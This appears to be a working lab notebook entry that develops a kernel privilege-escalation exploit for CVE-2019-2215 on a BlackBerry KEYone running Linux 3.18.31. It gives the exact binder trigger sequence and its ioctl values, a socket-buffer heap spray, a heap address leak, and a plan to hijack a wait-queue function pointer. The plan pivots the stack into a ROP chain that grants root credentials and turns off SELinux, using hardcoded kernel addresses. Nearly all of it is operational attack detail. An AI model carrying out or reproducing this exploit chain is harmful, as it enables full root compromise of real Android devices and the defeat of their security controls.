# 75 — CVE-2019-2215 on KEYone 3.18.31: CORRECT TRIGGER FOUND; uaccess blocks P0 copy; wake-path is the route

Date: 2026-10-14 (continued)

## THE TRIGGER (source-verified, PROVEN by spin-oracle panics)
3.18.31 binder_poll (fetched source: git.kernel.org v3.18.31 drivers/staging/android/binder.c
line 2567) differs from the Pixel 4.4 code the P0 PoC targeted:

    wait_for_proc_work = thread->transaction_stack == NULL &&
                         list_empty(&thread->todo) && thread->return_error == BR_OK;
    if (wait_for_proc_work) {
        if (binder_has_proc_work(proc, thread)) return POLLIN;
        poll_wait(filp, &proc->wait, wait);      // <-- proc wait (not UAF-able by THREAD_EXIT)
        ...
    } else {
        if (binder_has_thread_work(thread)) return POLLIN;
        poll_wait(filp, &thread->wait, wait);    // <-- UAF target!
        ...
    }

binder_has_thread_work = !list_empty(todo) || return_error != BR_OK || (looper & NEED_RETURN=0x20)
binder_get_thread initializes return_error=BR_OK(0x7201), looper|=0x20, wait at +0x48, kzalloc 0x128 (kmalloc-512).
binder_ioctl clears NEED_RETURN on every successful ioctl.

MAGIC STATE for thread->wait registration:
  transaction_stack != NULL && todo empty && return_error == BR_OK && !NEED_RETURN

Reached in ONE BINDER_WRITE_READ ioctl:
  1) write BC_ENTER_LOOPER (0x630c) once (looper bits; clears NEED_RETURN via ioctl epilogue)
  2) write BC_TRANSACTION (0x40406300 + 64-byte binder_transaction_data, target.handle=0,
     flags=0 sync, data_size=4) with read_buffer set: driver queues tcomplete to our todo,
     sets thread->transaction_stack = t, then the same ioctl's read consumes
     BR_NOOP+BR_TRANSACTION_COMPLETE (read_consumed == 8). Reply from servicemanager
     not yet arrived => todo empty => MAGIC.
  3) epoll_ctl(ADD, binder_fd, EPOLLIN) immediately => binder_poll polls thread->wait
     (priv_app may call servicemanager: allow appdomain servicemanager:binder call/transfer;
      servicemanager reply: allow servicemanager priv_app:binder transfer).
  4) ioctl(BINDER_THREAD_EXIT=0x40046208) => binder_free_thread => kfree(thread) (immediate, verified disasm).

PROOF: with a reclaim object carrying a NONZERO byte at chunk+0x48 (the wait.lock),
the child's epoll_ctl(DEL) spins in remove_wait_queue -> hard lockup -> kernel PANIC
(observed 3x: trigger4/trigger6). Trigger correct.

## RECLAIM
- unix-dgram skb data spray (sendmsg 96B payload, socketpair with 4MB buffers,
  O_NONBLOCK sender) reclaims the freed chunk reliably (panic proof with 1 send!).
  skb data alloc: kmalloc(SKB_DATA_ALIGN(96+shinfo)) -> kmalloc-512; data offset delta<=0x48
  (spin oracle hit with 0x01 pattern => delta <= 0x48).
- writev import_iovec kmalloc(29*16=464) NEVER reclaimed in 400 attempts (even with
  affinity + pre-groom). Reason unresolved; skb path is the working one.
- DEL's list ops (remove_wait_queue on freed B+0x48) write B+0x50 into B+0x50 and B+0x58
  (self-writes). With an skb payload those bytes are READABLE via recv => heap leak of
  the chunk address (B+0x50). DEL also sets task_list to {head,head} (empty list) =>
  makes a later wake of the stale wait queue harmless.

## CRITICAL KERNEL FACT (kills the P0 copy technique)
User-copy paths REJECT kernel addresses on this kernel:
  write(pipe, (void*)0xffffffc000080000, 64) -> -EFAULT
  write(pipe, (void*)0x1000, 64)            -> -EFAULT
(copytest binary). So the P0/Pixel approach (corrupted iovec causing copy_from_user
FROM a kernel address) cannot leak/write. The iovec trick is dead on 3.18.

## THE ROUTE: wake-path (wait->func hijack) — matches the ITW exploit
When the servicemanager reply arrives for our dead thread:
  binder_transaction(reply) -> target_thread = t->from (freed thread)
  -> binder_enqueue_thread_work(target_thread, ...) writes into the freed chunk (todo at +0x30)
  -> wake_up_interruptible_sync(&target_thread->wait) => __wake_up_common walks the
     reclaimed chunk's task_list and CALLS entry->func(curr, mode, sync, key).
The panics seen with zero payloads (trigger5/8 attempts) are consistent with this wake
oopsing on the uncontrolled list. This is the RCE primitive:
- Reclaim the chunk with an skb whose payload crafts a fake wait entry:
    lock (chunk+0x48) = 0
    head task_list.next/prev (chunk+0x50/0x58) = &entry.task_list
    entry (inside payload): func = <kernel gadget>
  func is called with x0 = entry address (a controlled kernel buffer at known payload addr).
- No KASLR: all static addresses known (base 0xffffffc000080000).
- Plan: func = stack pivot gadget (mov sp, x0 / ldp x29,x30,[x0]...) -> ROP chain inside
  the payload: commit_creds(prepare_kernel_cred(0)); str wzr,[selinux_enforcing];
  clean return (or at least creds before a controlled exit).
- The DEL (epoll_ctl DEL) should run BEFORE the reply arrives when possible: it writes
  head into the payload making the list empty-safe; and it produces the heap leak.

## Timing/race notes
- servicemanager reply arrives ~ms after the transaction; free+spray happen in ~100us
  (tight parent sequence), so the reply typically lands AFTER reclaim => wake fires on
  our payload.
- The reply-wake with an UNSAFE payload oopses -> panic -> reboot. Safety first:
  craft payload with a benign func (e.g., a plain `ret` gadget) and a terminating list
  once B is known from the leak; before B is known, prefer sequences where the DEL
  (which empties the list) runs first.
- Device panicked several times during experiments (expected; recovers on reboot).

## Infra (post-panic-storm)
- /sdcard (fuse) becomes flaky/dies after repeated panics; app process may be killed.
  RELIABLE CHANNELS:
  * stage binaries: adb push -> /data/local/tmp (verify md5; re-push after boot until
    md5 matches; files sometimes vanish/land empty if pushed during early boot)
  * run via toolbox ExecActivity: am start -n com.bbkeyone.toolbox/.ExecActivity
    --es cmd "cp /data/local/tmp/X /data/data/com.bbkeyone.toolbox/X; chmod 755 ...;
             /data/data/com.bbkeyone.toolbox/X 2>&1 | while read l; do log -t TAG \"$l\"; done"
    (NOTE: am force-stop the app first; ExecActivity handles onCreate only)
  * read output: adb logcat -d -s TAG  (log takes the message as an ARGUMENT:
    `log -t TAG "msg"`; piping into `log` does NOT work)
  * the v3 AgentService (/sdcard/.tb_cmd) works when /sdcard is healthy.

## NEXT SESSION CHECKLIST
1. Reboot cleanly; re-establish the logcat pipeline; re-push trigger8.
2. Stage-1 leak: tight sequence transaction->ADD->THREAD_EXIT->spray(zero payload)->
   DEL->drain; find the heap pointer (B+0x50) in the drained messages. Retry loop.
3. Find in vmlinux: a `ret` gadget + a stack pivot gadget (mov sp,x0 / ldp x29,x30,[x0])
   + offsets: selinux_enforcing 0xffffffc001473030; commit_creds 0xffffffc0000c013c;
   prepare_kernel_cred 0xffffffc0000c052c.
4. Stage-2: reclaim payload crafts the fake wait entry with func=pivot; reply-wake fires;
   ROP: prepare_kernel_cred(0) -> commit_creds -> selinux_enforcing=0 -> return.
5. Fallback if wake timing is hard: pipe_buffer `ops` reclaim variant, or re-examine why
   import_iovec never reclaims (could re-enable the deterministic iovec path).
